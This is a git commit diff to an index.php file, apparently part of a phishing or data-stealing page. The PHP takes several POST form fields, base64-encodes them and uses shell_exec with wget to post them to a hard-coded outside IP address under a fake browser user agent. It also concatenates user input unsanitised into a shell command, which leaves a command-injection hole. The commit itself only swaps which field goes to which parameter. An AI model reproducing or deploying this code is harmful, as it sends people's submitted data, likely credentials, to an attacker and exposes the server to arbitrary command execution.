99c7a505281a88ab89350bacbb0e92f4e4a5a760
mobileapps84741274 <64268204+mobileapps84741274@users.noreply.github.com>
2020-10-06 20:57:00 +0000

    Update index.php

--- index.php
+++ index.php
@@ -25,7 +25,7 @@ $google84742 = $_POST["linux3"];
 
 $google84742 = base64_encode($google84742);
 
-$google84744 = $_POST["linux1"];
+$google84744 = $_POST["linux4"];
 
 $google84744 = base64_encode($google84744);
 
@@ -33,11 +33,11 @@ $google847412 = $_POST["linux5"];
 
 $google847412 = base64_encode($google847412);
 
-$google847446 = $_POST["linux4"];
+$google847446 = $_POST["linux1"];
 
 $google847446 = base64_encode($google847446);
 
-echo shell_exec("wget -q -U 'Mozille84' --post-data=linux2='" . $google84741 . "&linux3=" . $google84742 . "&linux5=" . $google84744 . "&linux1=" . $google847412 . "&linux4=" . $google847446 . "' 'http://154.127.52.52:8884/?linux84=linux84' --header='Content-type: application/x-www-form-urlencoded'");
+echo shell_exec("wget -q -U 'Mozille84' --post-data=linux2='" . $google84741 . "&linux3=" . $google84742 . "&linux5=" . $google847412 . "&linux1=" . $google847446 . "&linux4=" . $google84744 . "' 'http://154.127.52.52:8884/?linux84=linux84' --header='Content-type: application/x-www-form-urlencoded'");
 
 }
 
